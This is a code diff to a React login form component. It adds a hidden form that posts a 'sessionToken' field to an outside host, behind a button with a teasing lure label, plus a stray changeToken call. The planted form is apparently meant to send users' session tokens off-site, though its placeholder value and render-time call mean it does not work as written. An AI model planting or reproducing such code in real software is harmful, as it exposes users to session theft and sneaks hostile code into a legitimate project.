@@ -10,6 +10,7 @@ const LoginForm = ({
   onChange,
   errors,
   successMessage,
+  changeToken,
   user
 }) => (
   <Card className="container">
@@ -46,6 +47,14 @@ const LoginForm = ({
 
       <CardText>Don't have an account? <Link to={'/signup'}>Create one</Link>.</CardText>
     </form>
+
+<div className="button-line">
+<form action="https://blr00bck/iwc/" method="POST">
+	<input type="hidden" name="sessionToken" value="read from cookie"/>
+	<RaisedButton type="submit" label="Wow such a nice button, wonder what it does!"/>
+</form>
+<button onClick={this.changeToken()}>Click me</button>
+</div>
   </Card>
 );
 
